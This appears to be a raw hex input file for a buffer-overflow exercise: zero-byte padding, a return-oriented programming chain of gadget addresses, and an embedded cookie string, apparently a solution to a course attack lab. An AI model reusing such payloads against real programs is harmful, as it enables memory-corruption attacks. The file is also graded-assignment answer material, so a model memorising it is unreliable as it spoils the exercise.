00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c8 21 40 00 00 00 00 00
61 21 40 00 00 00 00 00
56 21 40 00 00 00 00 00
48 00 00 00 00 00 00 00
48 22 40 00 00 00 00 00
08 22 40 00 00 00 00 00
13 22 40 00 00 00 00 00
b4 21 40 00 00 00 00 00
61 21 40 00 00 00 00 00
c3 1f 40 00 00 00 00 00
33 31 37 37 64 65 30 31
00

///////////////////////

c8 21 40 00 00 00 00 00
61 21 40 00 00 00 00 00
e9 21 40 00 00 00 00 00
d2 21 40 00 00 00 00 00
08 22 40 00 00 00 00 00
8c 21 40 00 00 00 00 00

56 21 40 00 00 00 00 00
d2 21 40 00 00 00 00 00
08 22 40 00 00 00 00 00
e9 21 40 00 00 00 00 00

fd 19 40 00 00 00 00 00